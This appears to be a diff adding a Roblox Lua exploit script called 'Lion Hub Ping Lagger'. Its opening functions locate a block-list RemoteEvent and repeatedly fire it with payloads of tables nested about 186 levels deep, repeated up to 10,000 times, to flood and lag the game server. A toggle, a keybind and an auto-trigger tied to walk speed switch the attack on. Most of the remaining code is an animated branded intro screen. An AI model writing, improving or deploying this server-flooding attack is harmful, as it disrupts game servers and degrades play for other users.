+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local remote
+    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then remote = r break end
+    end
+    if not remote then
+        for _, c in ipairs(rrs:GetChildren()) do
+            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
+        end
+    end
+    return remote
+end
+
+remote = findRemote()
+
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / 188), 10000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    local delay = cfg.interval
+    while active and remote do
+        local payload = buildPayload(cfg.power)
+        local ok = pcall(function() remote:FireServer(payload) end)
+        if not ok then
+            delay = math.min(delay * 1.5, 0.5)
+        else
+            delay = math.max(delay * 0.995, 0.05)
+        end
+        task.wait(delay)
+    end
+end
+
+local function flipLag(state, isManual)
+    active = state
+
+    if isManual then
+        if brainrotMode then
+            manualOverride = not state
+        else
+            manualOverride = false
+        end
+    end
+
+    if active then
+        if not remote then
+            remote = findRemote()
+            if not remote then
+                active = false
+                flipLag(false)
+                return
+            end
+        end
+        activateGrad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0,C.blue2),
+            ColorSequenceKeypoint.new(1,C.green2),
+        })
+        activateLbl.Text            = "ACTIVATED"
+        activateStroke.Color        = C.white
+        activateStroke.Transparency = 0
+        statusLbl.Text              = "ON"
+        statusLbl.TextColor3        = C.green
+        tw(statusPill, {BackgroundColor3=Color3.fromRGB(0,40,20)}, 0.2)
+        mainStroke.Color            = C.green
+        mainStroke.Transparency     = 0.1
+        task.spawn(runPingLoop)
+    else
+        activateGrad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0,C.blue1),
+            ColorSequenceKeypoint.new(1,C.green1),
+        })
+        activateLbl.Text            = "ACTIVATE"
+        activateStroke.Color        = C.blue3
+        activateStroke.Transparency = 0.4
+        statusLbl.Text              = "OFF"
+        statusLbl.TextColor3        = C.red
+        tw(statusPill, {BackgroundColor3=Color3.fromRGB(0,20,40)}, 0.2)
+        mainStroke.Color            = C.blue1
+        mainStroke.Transparency     = 0.35
+    end
+end
+
+activateBtn.MouseButton1Click:Connect(function()
+    flipLag(not active, true)
+end)
+activateBtn.MouseEnter:Connect(function()
+    if not active then tw(activateBtn,{BackgroundColor3=Color3.fromRGB(0,60,150)},0.1) end
+end)
+activateBtn.MouseLeave:Connect(function()
+    if not active then tw(activateBtn,{BackgroundColor3=C.card},0.1) end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- AUTO BRAINROT DETECTION
+-- ══════════════════════════════════════════════════════════════════════
+RunService.Heartbeat:Connect(function()
+    if not cfg.autoBrainrot then
+        if brainrotMode then
+            brainrotMode = false
+            lastBrainrotState = false
+        end
+        return
+    end
+
+    local char = plr.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum then return end
+
+    local hasBrainrot = hum.WalkSpeed < 25
+
+    if hasBrainrot and not lastBrainrotState then
+        brainrotMode = true
+        lastBrainrotState = true
+        manualOverride = false
+        flipLag(true)
+    elseif not hasBrainrot and lastBrainrotState then
+        brainrotMode = false
+        lastBrainrotState = false
+        manualOverride = false
+        flipLag(false)
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- INPUT HANDLER
+-- ══════════════════════════════════════════════════════════════════════
+UserInputService.InputBegan:Connect(function(input, processed)
+    local kc  = input.KeyCode
+    if kc == Enum.KeyCode.Unknown then return end
+
+    local isGp = isGamepad(kc)
+    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+    if listeningFor then
+        if kc == Enum.KeyCode.Escape then
+            listeningFor = nil
+            updateKbLabels()
+            return
+        end
+        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+            cfg.keybindKb = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
+        end
+        if listeningFor == "gp" and isGp then
+            cfg.keybindGp = kc.Name
+            listeningFor  = nil
+            updateKbLabels()
+            saveConfig()
+            return
+        end
+        return
+    end
+
+    if processed then return end
+
+    if kc == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        if not mainFrame.Visible then closeSettings() end
+        return
+    end
+
+    local kbEnum = resolveKb(cfg.keybindKb)
+    local gpEnum = resolveKb(cfg.keybindGp)
+
+    if (kbEnum and kc == kbEnum and isKb)
+    or (gpEnum and kc == gpEnum and isGp) then
+        flipLag(not active, true)
+    end
+end)
+
+updateKbLabels()
+
+-- ══════════════════════════════════════════════════════════════════════
+-- LION HUB INTRO
+-- ══════════════════════════════════════════════════════════════════════
+local introScreen = Instance.new("ScreenGui")
+introScreen.Name = "LionHubIntro"
+introScreen.IgnoreGuiInset = true
+introScreen.ResetOnSpawn = false
+introScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+introScreen.Parent = plrGui
+
+local introSkipped = false
+local skipConnection = nil
+local introSound = nil
+
+local SOUND_ID = 120267378058133
+local SKIP_SECONDS = 10
+
+-- Cores Lion Hub (Azul e Verde)
+local LION_BLUE = Color3.fromRGB(0, 100, 255)
+local LION_DARK_BLUE = Color3.fromRGB(0, 40, 120)
+local LION_LIGHT_BLUE = Color3.fromRGB(80, 180, 255)
+local LION_GREEN = Color3.fromRGB(0, 255, 65)
+local LION_DARK_GREEN = Color3.fromRGB(0, 100, 25)
+local LION_LIGHT_GREEN = Color3.fromRGB(80, 255, 120)
+
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = Lighting
+
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.fromScale(1, 1)
+overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+overlay.BackgroundTransparency = 0.3
+overlay.BorderSizePixel = 0
+overlay.ZIndex = 1
+overlay.Parent = introScreen
+
+local darkOverlay = Instance.new("Frame")
+darkOverlay.Size = UDim2.fromScale(1, 1)
+darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+darkOverlay.BackgroundTransparency = 0.5
+darkOverlay.BorderSizePixel = 0
+darkOverlay.ZIndex = 1
+darkOverlay.Parent = introScreen
+
+local vignette = Instance.new("ImageLabel")
+vignette.Size = UDim2.fromScale(1, 1)
+vignette.BackgroundTransparency = 1
+vignette.Image = "rbxassetid://195611797"
+vignette.ImageColor3 = LION_DARK_BLUE
+vignette.ImageTransparency = 0.35
+vignette.ZIndex = 2
+vignette.Parent = introScreen
+
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 850, 0, 130)
+container.AnchorPoint = Vector2.new(0.5, 0.5)
+container.Position = UDim2.new(0.5, 0, 0.5, 0)
+container.BackgroundTransparency = 1
+container.BorderSizePixel = 0
+container.ClipsDescendants = false
+container.ZIndex = 5
+container.Parent = introScreen
+
+local mainLabel = Instance.new("TextLabel")
+mainLabel.Size = UDim2.new(1, 0, 1, 0)
+mainLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+mainLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainLabel.BackgroundTransparency = 1
+mainLabel.Text = "LION HUB"
+mainLabel.TextColor3 = LION_BLUE
+mainLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+mainLabel.TextStrokeTransparency = 0
+mainLabel.Font = Enum.Font.GothamBlack
+mainLabel.TextSize = 88
+mainLabel.TextXAlignment = Enum.TextXAlignment.Center
+mainLabel.TextTransparency = 1
+mainLabel.ZIndex = 5
+mainLabel.Parent = container
+
+local leftLabel = Instance.new("TextLabel")
+leftLabel.Size = UDim2.new(0, 400, 1, 0)
+leftLabel.AnchorPoint = Vector2.new(1, 0.5)
+leftLabel.Position = UDim2.new(0.5, -10, 0.5, 0)
+leftLabel.BackgroundTransparency = 1
+leftLabel.Text = "LION"
+leftLabel.TextColor3 = LION_BLUE
+leftLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+leftLabel.TextStrokeTransparency = 0
+leftLabel.Font = Enum.Font.GothamBlack
+leftLabel.TextSize = 88
+leftLabel.TextXAlignment = Enum.TextXAlignment.Right
+leftLabel.TextTransparency = 1
+leftLabel.ZIndex = 5
+leftLabel.Visible = true
+leftLabel.Parent = container
+
+local rightLabel = Instance.new("TextLabel")
+rightLabel.Size = UDim2.new(0, 200, 1, 0)
+rightLabel.AnchorPoint = Vector2.new(0, 0.5)
+rightLabel.Position = UDim2.new(0.5, -10, 0.5, 0)
+rightLabel.BackgroundTransparency = 1
+rightLabel.Text = "HUB"
+rightLabel.TextColor3 = LION_GREEN
+rightLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+rightLabel.TextStrokeTransparency = 0
+rightLabel.Font = Enum.Font.GothamBlack
+rightLabel.TextSize = 88
+rightLabel.TextXAlignment = Enum.TextXAlignment.Left
+rightLabel.TextTransparency = 1
+rightLabel.ZIndex = 5
+rightLabel.Visible = true
+rightLabel.Parent = container
+
+local lightBeam = Instance.new("Frame")
+lightBeam.Size = UDim2.new(0, 0, 1.1, 0)
+lightBeam.AnchorPoint = Vector2.new(0, 0.5)
+lightBeam.Position = UDim2.new(0, -20, 0.5, 0)
+lightBeam.BackgroundColor3 = LION_BLUE
+lightBeam.BackgroundTransparency = 0.5
+lightBeam.BorderSizePixel = 0
+lightBeam.ZIndex = 6
+lightBeam.Parent = container
+
+local beamGlow = Instance.new("Frame")
+beamGlow.Size = UDim2.new(0, 0, 1.3, 0)
+beamGlow.AnchorPoint = Vector2.new(0, 0.5)
+beamGlow.Position = UDim2.new(0, -20, 0.5, 0)
+beamGlow.BackgroundColor3 = LION_GREEN
+beamGlow.BackgroundTransparency = 0.7
+beamGlow.BorderSizePixel = 0
+beamGlow.ZIndex = 5
+beamGlow.Parent = container
+
+local beamSparkles = Instance.new("Frame")
+beamSparkles.Size = UDim2.new(0, 0, 1, 0)
+beamSparkles.AnchorPoint = Vector2.new(0, 0.5)
+beamSparkles.Position = UDim2.new(0, -20, 0.5, 0)
+beamSparkles.BackgroundColor3 = LION_LIGHT_BLUE
+beamSparkles.BackgroundTransparency = 0.8
+beamSparkles.BorderSizePixel = 0
+beamSparkles.ZIndex = 7
+beamSparkles.Parent = container
+
+local subLabel = Instance.new("TextLabel")
+subLabel.Size = UDim2.new(1, 0, 0, 40)
+subLabel.AnchorPoint = Vector2.new(0.5, 0)
+subLabel.Position = UDim2.new(0.5, 0, 0.5, 70)
+subLabel.BackgroundTransparency = 1
+subLabel.Text = "PING LAGGER"
+subLabel.TextColor3 = LION_BLUE
+subLabel.Font = Enum.Font.GothamBold
+subLabel.TextSize = 14
+subLabel.TextXAlignment = Enum.TextXAlignment.Center
+subLabel.TextTransparency = 1
+subLabel.ZIndex = 5
+subLabel.Parent = introScreen
+
+local subLabel2 = Instance.new("TextLabel")
+subLabel2.Size = UDim2.new(1, 0, 0, 25)
+subLabel2.AnchorPoint = Vector2.new(0.5, 0)
+subLabel2.Position = UDim2.new(0.5, 0, 0.5, 105)
+subLabel2.BackgroundTransparency = 1
+subLabel2.Text = "TAP TO SKIP INTRO"
+subLabel2.TextColor3 = LION_DARK_BLUE
+subLabel2.Font = Enum.Font.Gotham
+subLabel2.TextSize = 11
+subLabel2.TextXAlignment = Enum.TextXAlignment.Center
+subLabel2.TextTransparency = 1
+subLabel2.ZIndex = 5
+subLabel2.Parent = introScreen
+
+local accentBar = Instance.new("Frame")
+accentBar.Size = UDim2.new(0, 0, 0, 2)
+accentBar.AnchorPoint = Vector2.new(0.5, 0)
+accentBar.Position = UDim2.new(0.5, 0, 0.5, 62)
+accentBar.BackgroundColor3 = LION_BLUE
+accentBar.BackgroundTransparency = 0
+accentBar.BorderSizePixel = 0
+accentBar.ZIndex = 5
+accentBar.Parent = introScreen
+
+local flashFrame = Instance.new("Frame")
+flashFrame.Size = UDim2.fromScale(1, 1)
+flashFrame.BackgroundColor3 = LION_LIGHT_BLUE
+flashFrame.BackgroundTransparency = 1
+flashFrame.BorderSizePixel = 0
+flashFrame.ZIndex = 10
+flashFrame.Parent = introScreen
+
+local glitchContainer = Instance.new("Frame")
+glitchContainer.Size = UDim2.new(1, 0, 1, 0)
+glitchContainer.BackgroundTransparency = 1
+glitchContainer.ZIndex = 6
+glitchContainer.Parent = introScreen
+
+local dripContainer = Instance.new("Frame")
+dripContainer.Size = UDim2.new(1, 0, 1, 0)
+dripContainer.BackgroundTransparency = 1
+dripContainer.ZIndex = 7
+dripContainer.Parent = introScreen
+
+local tapToRemoveLabel = Instance.new("TextLabel")
+tapToRemoveLabel.Size = UDim2.new(0, 150, 0, 24)
+tapToRemoveLabel.AnchorPoint = Vector2.new(0.5, 1)
+tapToRemoveLabel.Position = UDim2.new(0.5, 0, 1, -20)
+tapToRemoveLabel.BackgroundTransparency = 1
+tapToRemoveLabel.Text = "✦ TAP TO SKIP ✦"
+tapToRemoveLabel.TextColor3 = LION_BLUE
+tapToRemoveLabel.Font = Enum.Font.GothamBold
+tapToRemoveLabel.TextSize = 10
+tapToRemoveLabel.TextXAlignment = Enum.TextXAlignment.Center
+tapToRemoveLabel.TextTransparency = 0.5
+tapToRemoveLabel.ZIndex = 15
+tapToRemoveLabel.Parent = introScreen
+
+-- ===== FUNÇÕES =====
+local function doFlash(color, alpha, duration)
+    flashFrame.BackgroundColor3 = color or LION_LIGHT_BLUE
+    flashFrame.BackgroundTransparency = 1 - (alpha or 0.85)
+    task.delay(duration or 0.06, function()
+        if not introSkipped then
+            TweenService:Create(flashFrame, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+        else
+            flashFrame.BackgroundTransparency = 1
+        end
+    end)
+end
+
+local function runLightBeam()
+    lightBeam.Size = UDim2.new(0, 45, 1.1, 0)
+    beamGlow.Size = UDim2.new(0, 65, 1.3, 0)
+    beamSparkles.Size = UDim2.new(0, 45, 1, 0)
+
+    lightBeam.BackgroundTransparency = 0.35
+    beamGlow.BackgroundTransparency = 0.55
+    beamSparkles.BackgroundTransparency = 0.75
+
+    local beamTween = TweenService:Create(lightBeam, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
+        Position = UDim2.new(1, 20, 0.5, 0)
+    })
+    beamTween:Play()
+
+    local glowTween = TweenService:Create(beamGlow, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
+        Position = UDim2.new(1, 20, 0.5, 0)
+    })
+    glowTween:Play()
+
+    local sparkleTween = TweenService:Create(beamSparkles, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
+        Position = UDim2.new(1, 20, 0.5, 0)
+    })
+    sparkleTween:Play()
+
+    local pulseCount = 0
+    local pulseConnection
+    pulseConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        if introSkipped then
+            if pulseConnection then pulseConnection:Disconnect() end
+            return
+        end
+        pulseCount = pulseCount + 1
+        if pulseCount % 3 == 0 then
+            local pulseIntensity = 0.3 + math.sin(pulseCount * 0.5) * 0.15
+            lightBeam.BackgroundTransparency = 0.3 - (pulseIntensity * 0.2)
+            beamGlow.BackgroundTransparency = 0.5 - (pulseIntensity * 0.1)
+            beamSparkles.BackgroundTransparency = 0.7 - (pulseIntensity * 0.15)
+        end
+    end)
+
+    beamTween.Completed:Wait()
+
+    if pulseConnection then pulseConnection:Disconnect() end
+
+    TweenService:Create(lightBeam, TweenInfo.new(0.25), {
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 0, 1.1, 0)
+    }):Play()
+    TweenService:Create(beamGlow, TweenInfo.new(0.25), {
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 0, 1.3, 0)
+    }):Play()
+    TweenService:Create(beamSparkles, TweenInfo.new(0.25), {
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 0, 1, 0)
+    }):Play()
+end
+
+local function changeToBlueGreen()
+    task.wait(0.2)
+    TweenService:Create(mainLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextColor3 = LION_BLUE
+    }):Play()
+end
+
+local glitchChars = {"!", "#", "%", "/", "[", "]", "░", "▒", "▓", "—", "=", "*", "^", "~", "¦", "¤", "∆", "∑", "Ω", "π"}
+
+local function glitchText(lbl, original)
+    if introSkipped then return end
+    for i = 1, 4 do
+        if introSkipped then break end
+        local s = ""
+        for c in original:gmatch(".") do
+            s = s .. (math.random() < 0.35 and glitchChars[math.random(#glitchChars)] or c)
+        end
+        lbl.Text = s
+        task.wait(0.03)
+    end
+    if not introSkipped then
+        lbl.Text = original
+    end
+end
+
+local function addGlitchBar()
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(1, 0, 0, math.random(2, 12))
+    bar.Position = UDim2.new(0, 0, math.random(10, 90)/100, 0)
+    bar.BackgroundColor3 = LION_BLUE
+    bar.BackgroundTransparency = math.random(45, 70) / 100
+    bar.BorderSizePixel = 0
+    bar.ZIndex = 6
+    bar.Parent = glitchContainer
+    task.delay(0.1, function()
+        if bar then
+            TweenService:Create(bar, TweenInfo.new(0.1), {BackgroundTransparency = 1}):Play()
+            task.delay(0.1, function() bar:Destroy() end)
+        end
+    end)
+end
+
+local function shakeScreen(intensity, duration)
+    if introSkipped then return end
+    local baseLeft = UDim2.new(0.5, -8, 0.5, 0)
+    local baseRight = UDim2.new(0.5, 8, 0.5, 0)
+    local startTime = tick()
+
+    while tick() - startTime < duration and not introSkipped do
+        local currentIntensity = intensity * (1 - ((tick() - startTime) / duration))
+        local ox = math.random(-math.floor(currentIntensity), math.floor(currentIntensity))
+        local oy = math.random(-math.floor(currentIntensity * 0.5), math.floor(currentIntensity * 0.5))
+        leftLabel.Position = UDim2.new(0.5, -8 + ox, 0.5, oy)
+        rightLabel.Position = UDim2.new(0.5, 8 + ox, 0.5, oy)
+        task.wait(0.02)
+    end
+
+    if not introSkipped then
+        TweenService:Create(leftLabel, TweenInfo.new(0.05), {Position = baseLeft}):Play()
+        TweenService:Create(rightLabel, TweenInfo.new(0.05), {Position = baseRight}):Play()
+    end
+end
+
+local function setupAudio()
+    introSound = Instance.new("Sound")
+    introSound.SoundId = "rbxassetid://" .. SOUND_ID
+    introSound.Volume = 0.7
+    introSound.PlayOnRemove = false
+    introSound.Parent = introScreen
+    introSound:Play()
+    task.delay(0.6, function()
+        if introSound and not introSkipped then
+            introSound.TimePosition = SKIP_SECONDS
+        end
+    end)
+    return introSound
+end
+
+local function fadeOutAudio(duration)
+    if not introSound then return end
+    local startVolume = introSound.Volume
+    local steps = 30
+    for i = 1, steps do
+        if introSkipped or not introSound then break end
+        introSound.Volume = startVolume * (1 - (i / steps))
+        task.wait(duration / steps)
+    end
+    if introSound then
+        introSound.Volume = 0
+        introSound:Stop()
+    end
+end
+
+local function stopAudio()
+    if introSound then
+        introSound:Stop()
+        introSound:Destroy()
+    end
+end
+
+local activeDrips = 0
+local function createDrip(startX, startY, width, height, duration, delay)
+    task.wait(delay)
+    if introSkipped then return end
+    activeDrips = activeDrips + 1
+
+    local drip = Instance.new("Frame")
+    drip.Size = UDim2.new(0, width, 0, height)
+    drip.Position = UDim2.new(0.5, startX, 0.5, startY)
+    drip.BackgroundColor3 = LION_BLUE
+    drip.BackgroundTransparency = 0.25
+    drip.BorderSizePixel = 0
+    drip.ZIndex = 7
+    drip.Parent = dripContainer
+
+    local stretch = TweenService:Create(drip, TweenInfo.new(duration * 0.35), {
+        Size = UDim2.new(0, width, 0, height + 22),
+        BackgroundTransparency = 0.1
+    })
+    stretch:Play()
+
+    task.wait(duration * 0.35)
+
+    if introSkipped then
+        drip:Destroy()
+        activeDrips = activeDrips - 1
+        return
+    end
+
+    local fall = TweenService:Create(drip, TweenInfo.new(duration * 0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.5, startX + math.random(-3, 3), 0.5, startY + 80),
+        BackgroundTransparency = 1
+    })
+    fall:Play()
+
+    fall.Completed:Connect(function()
+        drip:Destroy()
+        activeDrips = activeDrips - 1
+    end)
+end
+
+local function startDripping()
+    if introSkipped then return end
+    local fullText = "LION HUB"
+    local font = Enum.Font.GothamBlack
+    local textSize = 88
+
+    local textBoundsFull = TextService:GetTextSize(fullText, textSize, font, Vector2.new(math.huge, math.huge))
+    local textHeight = textBoundsFull.Y
+
+    local drips = {}
+    local delayCounter = 0
+
+    for i = 1, #fullText do
+        local char = fullText:sub(i, i)
+        local charBounds = TextService:GetTextSize(char, textSize, font, Vector2.new(math.huge, math.huge))
+        local charWidth = charBounds.X
+
+        local precedingText = fullText:sub(1, i-1)
+        local precedingWidth = 0
+        if i > 1 then
+            precedingWidth = TextService:GetTextSize(precedingText, textSize, font, Vector2.new(math.huge, math.huge)).X
+        end
+
+        local totalTextWidth = textBoundsFull.X
+        local leftEdgeOffset = -totalTextWidth / 2
+        local charLeft = leftEdgeOffset + precedingWidth
+        local charCenterX = charLeft + charWidth / 2
+
+        local startY = textHeight / 2 + 3
+
+        local rx = math.random(-2, 2)
+        local ry = math.random(0, 4)
+
+        local dripWidth = math.clamp(math.floor(charWidth * 0.35), 3, 7)
+        local dripHeight = math.random(4, 7)
+        local duration = 0.5 + math.random() * 0.2
+        local delay = delayCounter * 0.07
+
+        table.insert(drips, {
+            startX = charCenterX + rx,
+            startY = startY + ry,
+            width = dripWidth,
+            height = dripHeight,
+            duration = duration,
+            delay = delay
+        })
+        delayCounter = delayCounter + 1
+    end
+
+    for _, d in ipairs(drips) do
+        if introSkipped then break end
+        createDrip(d.startX, d.startY, d.width, d.height, d.duration, d.delay)
+    end
+end
+
+local function skipIntro()
+    if introSkipped then return end
+    introSkipped = true
+
+    stopAudio()
+    if skipConnection then skipConnection:Disconnect() end
+
+    doFlash(LION_LIGHT_BLUE, 0.8, 0.1)
+
+    mainLabel.TextColor3 = LION_BLUE
+    mainLabel.Text = "LION HUB"
+
+    local fadeInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+    TweenService:Create(mainLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(leftLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(rightLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(subLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(subLabel2, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(accentBar, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(overlay, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(darkOverlay, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.25), {Size = 0}):Play()
+
+    task.wait(0.3)
+    introScreen:Destroy()
+    blur:Destroy()
+end
+
+local function playIntro()
+    setupAudio()
+
+    skipConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            skipIntro()
+        end
+    end)
+
+    task.spawn(function()
+        while not introSkipped and tapToRemoveLabel.Parent do
+            for t = 0.4, 0.8, 0.05 do
+                if introSkipped then break end
+                tapToRemoveLabel.TextTransparency = t
+                task.wait(0.05)
+            end
+            for t = 0.8, 0.4, -0.05 do
+                if introSkipped then break end
+                tapToRemoveLabel.TextTransparency = t
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    leftLabel.Position = UDim2.new(-0.9, 0, -0.6, 0)
+    rightLabel.Position = UDim2.new(1.9, 0, 1.6, 0)
+    leftLabel.Rotation = -30
+    rightLabel.Rotation = 30
+    mainLabel.TextTransparency = 1
+
+    TweenService:Create(blur, TweenInfo.new(0.7), {Size = 18}):Play()
+    TweenService:Create(overlay, TweenInfo.new(0.7), {BackgroundTransparency = 0.2}):Play()
+    TweenService:Create(darkOverlay, TweenInfo.new(0.7), {BackgroundTransparency = 0.4}):Play()
+    task.wait(0.35)
+
+    if introSkipped then return end
+
+    TweenService:Create(leftLabel, TweenInfo.new(0.45), {TextTransparency = 0}):Play()
+    TweenService:Create(rightLabel, TweenInfo.new(0.45), {TextTransparency = 0}):Play()
+
+    TweenService:Create(leftLabel, TweenInfo.new(0.55, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, -220, 0.5, -80), Rotation = -15
+    }):Play()
+    TweenService:Create(rightLabel, TweenInfo.new(0.55, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, 120, 0.5, 80), Rotation = 15
+    }):Play()
+    task.wait(0.45)
+
+    if introSkipped then return end
+
+    local smooth = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    TweenService:Create(leftLabel, smooth, {Position = UDim2.new(0.5, -170, 0.5, -50), Rotation = -8}):Play()
+    TweenService:Create(rightLabel, smooth, {Position = UDim2.new(0.5, 80, 0.5, 50), Rotation = 8}):Play()
+    task.wait(0.35)
+
+    if introSkipped then return end
+
+    TweenService:Create(leftLabel, smooth, {Position = UDim2.new(0.5, -120, 0.5, -25), Rotation = -4}):Play()
+    TweenService:Create(rightLabel, smooth, {Position = UDim2.new(0.5, 40, 0.5, 25), Rotation = 4}):Play()
+    task.wait(0.3)
+
+    if introSkipped then return end
+
+    TweenService:Create(leftLabel, smooth, {Position = UDim2.new(0.5, -60, 0.5, -10), Rotation = -2}):Play()
+    TweenService:Create(rightLabel, smooth, {Position = UDim2.new(0.5, -10, 0.5, 10), Rotation = 2}):Play()
+    task.wait(0.25)
+
+    if introSkipped then return end
+
+    local glitchEnd = tick() + 0.9
+    while tick() < glitchEnd and not introSkipped do
+        local ox = math.random(-20, 20)
+        local oy = math.random(-10, 10)
+        leftLabel.Position = UDim2.new(0.5, -60 + ox, 0.5, -10 + oy)
+        rightLabel.Position = UDim2.new(0.5, -10 + ox, 0.5, 10 + oy)
+
+        if math.random() < 0.35 then task.spawn(glitchText, leftLabel, "LION") end
+        if math.random() < 0.35 then task.spawn(glitchText, rightLabel, "HUB") end
+        if math.random() < 0.4 then addGlitchBar() end
+        if math.random() < 0.1 then doFlash(LION_LIGHT_BLUE, 0.2, 0.03) end
+
+        task.wait(0.045)
+    end
+
+    if introSkipped then return end
+
+    leftLabel.Visible = false
+    rightLabel.Visible = false
+    mainLabel.TextTransparency = 0
+    mainLabel.TextColor3 = LION_BLUE
+
+    doFlash(LION_LIGHT_BLUE, 0.5, 0.05)
+    task.wait(0.08)
+    if introSkipped then return end
+
+    TweenService:Create(mainLabel, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        TextSize = 92
+    }):Play()
+    task.wait(0.12)
+
+    if introSkipped then return end
+
+    TweenService:Create(mainLabel, TweenInfo.new(0.1), {TextSize = 88}):Play()
+
+    doFlash(LION_LIGHT_BLUE, 0.95, 0.05)
+    task.wait(0.02)
+    doFlash(LION_LIGHT_BLUE, 0.65, 0.08)
+
+    task.spawn(shakeScreen, 10, 0.25)
+
+    runLightBeam()
+    changeToBlueGreen()
+
+    TweenService:Create(accentBar, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 420, 0, 2)
+    }):Play()
+
+    task.wait(0.18)
+    if introSkipped then return end
+    
+    subLabel.Text = "PING LAGGER"
+    TweenService:Create(subLabel, TweenInfo.new(0.4), {TextTransparency = 0.05}):Play()
+    TweenService:Create(subLabel2, TweenInfo.new(0.4), {TextTransparency = 0.15}):Play()
+    task.wait(0.1)
+    doFlash(LION_LIGHT_BLUE, 0.3, 0.04)
+
+    TweenService:Create(subLabel, TweenInfo.new(0.2), {TextSize = 15}):Play()
+    task.wait(0.2)
+    TweenService:Create(subLabel, TweenInfo.new(0.2), {TextSize = 14}):Play()
+
+    task.wait(0.65)
+    if introSkipped then return end
+
+    startDripping()
+
+    while activeDrips > 0 and not introSkipped do
+        task.wait(0.1)
+    end
+
+    if introSkipped then return end
+    task.wait(0.45)
+
+    fadeOutAudio(1.2)
+
+    local fadeInfo = TweenInfo.new(0.85, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+    TweenService:Create(mainLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(subLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(subLabel2, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(accentBar, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(overlay, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(darkOverlay, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(blur, TweenInfo.new(0.85), {Size = 0}):Play()
+    TweenService:Create(dripContainer, fadeInfo, {BackgroundTransparency = 1}):Play()
+
+    task.wait(0.9)
+
+    stopAudio()
+    if skipConnection then skipConnection:Disconnect() end
+    introScreen:Destroy()
+    blur:Destroy()
+end
+
+playIntro()
